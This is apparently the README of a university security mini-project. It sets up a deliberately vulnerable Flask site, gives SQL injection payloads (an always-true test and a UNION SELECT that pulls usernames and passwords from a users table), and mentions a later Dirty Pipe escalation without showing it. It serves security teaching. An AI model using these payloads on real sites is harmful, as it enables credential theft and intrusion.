# INF8602 mini-projet

Fake website with SQL injection vulnerability for user credential retrieval, then Dirty Pipe exploit on the server.

## Setup

### Install the required packages
```bash
pip install flask sqlite3
``` 

### Run the Flask app
```bash
python app.py
```
### [Access the app](http://127.0.0.1:5000)


## Exploit SQL injection

Test the SQL injection in search bar, if it returns all reviews, it means the SQL injection is successful.
```sql
' OR 1=1 --
```

Exploit the SQL injection to get users:
```sql
a%' UNION SELECT NULL AS id, 'leaked' AS user, username AS title, password AS comment, 0.0 AS rating FROM users --
```



![alt text](image.png)
